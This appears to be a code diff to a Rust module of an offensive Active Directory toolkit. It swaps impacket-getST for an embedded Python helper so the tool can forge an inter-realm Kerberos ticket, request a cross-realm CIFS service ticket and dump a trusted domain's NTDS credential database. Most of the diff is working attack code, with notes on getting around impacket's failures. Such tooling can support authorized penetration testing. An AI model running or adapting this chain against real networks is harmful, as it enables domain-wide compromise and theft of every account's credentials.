@@ -8,6 +8,10 @@ use crate::credentials;
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
+/// Embedded Python helper that does a cross-realm TGS-REQ using a forged
+/// inter-realm TGT. See `forge_inter_realm_and_dump` for why this exists.
+const CROSS_REALM_TGS_HELPER: &str = include_str!("cross_realm_tgs.py");
+
 /// Extract trust keys by dumping secrets for a trusted domain's machine account.
 ///
 /// Required args: `domain`, `username`, `dc_ip`, `trusted_domain`
@@ -108,10 +112,13 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
 ///    salt-derivation bug on trust accounts that yields
 ///    `KRB_AP_ERR_BAD_INTEGRITY` whenever the AES key is supplied alongside
 ///    the NT hash. The NT-only ticket validates against modern KDCs.
-/// 2. **getST** presents that inter-realm TGT to the target KDC and requests
-///    a TGS for `cifs/<target>`. This step is required because the impacket
-///    referral path is broken — `secretsdump -k` against a cross-realm TGT
-///    sends the referral to the wrong KDC and fails.
+/// 2. **`cross_realm_tgs.py`** (embedded helper) loads the inter-realm TGT
+///    directly and calls `getKerberosTGS` against the target KDC for
+///    `cifs/<target>`. We can't use `impacket-getST -k -no-pass` here:
+///    impacket's `CCache.parseFile` only matches `krbtgt/<DOMAIN>@<DOMAIN>`
+///    (intra-realm TGTs) so the inter-realm credential `krbtgt/<TARGET>@<SOURCE>`
+///    is silently ignored. getST then falls through to no-pass auth that
+///    returns `KDC_ERR_WRONG_REALM` with exit code 0, hiding the failure.
 /// 3. **nxc smb --ntds** dumps NTDS using the TGS via Kerberos cache.
 ///    `impacket-secretsdump` is unusable here: its DRSUAPI bind rejects
 ///    cross-realm TGS auth with `Bind context rejected: invalid_checksum`.
@@ -172,26 +179,28 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // --- Step 2: present inter-realm TGT, request TGS for cifs/<target> ---
+    // --- Step 2: cross-realm TGS via embedded helper ---
     //
-    // The TGT we just forged is for `Administrator@SOURCE_DOMAIN` with server
-    // `krbtgt/TARGET@SOURCE`. The principal passed to getST must match the
-    // TGT's client realm (source_domain), not the SPN's realm (target_domain) —
-    // otherwise getST treats the principal as belonging to target_domain, which
-    // doesn't match the inter-realm TGT, and the cross-realm exchange fails
-    // silently (exit 0, no ccache file). Always use source_domain here.
+    // Write the helper to the tempdir and invoke it. The helper opens the
+    // forged inter-realm TGT, calls `getKerberosTGS` directly against the
+    // target KDC, and writes the resulting TGS to a new ccache. See the
+    // function docstring above for why we can't use `impacket-getST` here.
+    let helper_path = cwd.join("cross_realm_tgs.py");
+    std::fs::write(&helper_path, CROSS_REALM_TGS_HELPER)
+        .context("failed to write cross_realm_tgs helper")?;
+
     let cifs_spn = format!("cifs/{target}");
-    let target_principal = format!("{source_domain}/{username}");
-    let mut getst = CommandBuilder::new("impacket-getST")
-        .arg("-k")
-        .arg("-no-pass")
-        .flag("-spn", &cifs_spn);
-    if let Some(ip) = dc_ip {
-        getst = getst.flag("-dc-ip", ip);
-    }
-    let getst_output = getst
-        .arg(&target_principal)
-        .env("KRB5CCNAME", tgt_ccache.to_string_lossy().into_owned())
+    let tgs_ccache = cwd.join("cross_realm_tgs.ccache");
+    let target_kdc = dc_ip.unwrap_or(target);
+
+    let getst_output = CommandBuilder::new("python3")
+        .arg(helper_path.to_string_lossy().into_owned())
+        .flag("--in-ccache", tgt_ccache.to_string_lossy().into_owned())
+        .flag("--out-ccache", tgs_ccache.to_string_lossy().into_owned())
+        .flag("--spn", &cifs_spn)
+        .flag("--source-realm", source_domain.to_uppercase())
+        .flag("--target-realm", target_domain.to_uppercase())
+        .flag("--target-kdc", target_kdc)
         .current_dir(&cwd)
         .timeout_secs(120)
         .execute()
@@ -200,11 +209,11 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     if !getst_output.success {
         return Ok(ToolOutput {
             stdout: format!(
-                "=== impacket-ticketer ===\n{}\n=== impacket-getST ===\n{}",
+                "=== impacket-ticketer ===\n{}\n=== cross_realm_tgs ===\n{}",
                 ticketer_output.stdout, getst_output.stdout
             ),
             stderr: format!(
-                "--- ticketer stderr ---\n{}\n--- getST stderr ---\n{}",
+                "--- ticketer stderr ---\n{}\n--- cross_realm_tgs stderr ---\n{}",
                 ticketer_output.stderr, getst_output.stderr
             ),
             exit_code: getst_output.exit_code,
@@ -212,16 +221,9 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         });
     }
 
-    // getST writes "<user>@<spn-with-_-instead-of-/>@<REALM>.ccache".
-    let tgs_filename = format!(
-        "{username}@{}@{}.ccache",
-        cifs_spn.replace('/', "_"),
-        target_domain.to_uppercase()
-    );
-    let tgs_ccache = cwd.join(&tgs_filename);
     if !tgs_ccache.exists() {
         anyhow::bail!(
-            "impacket-getST reported success but {} was not produced",
+            "cross_realm_tgs helper reported success but {} was not produced",
             tgs_ccache.display()
         );
     }
@@ -242,11 +244,11 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         .await?;
 
     let stdout = format!(
-        "=== impacket-ticketer ===\n{}\n=== impacket-getST ===\n{}\n=== nxc smb --ntds ===\n{}",
+        "=== impacket-ticketer ===\n{}\n=== cross_realm_tgs ===\n{}\n=== nxc smb --ntds ===\n{}",
         ticketer_output.stdout, getst_output.stdout, dump_output.stdout
     );
     let stderr = format!(
-        "--- ticketer stderr ---\n{}\n--- getST stderr ---\n{}\n--- nxc stderr ---\n{}",
+        "--- ticketer stderr ---\n{}\n--- cross_realm_tgs stderr ---\n{}\n--- nxc stderr ---\n{}",
         ticketer_output.stderr, getst_output.stderr, dump_output.stderr
     );
     Ok(ToolOutput {
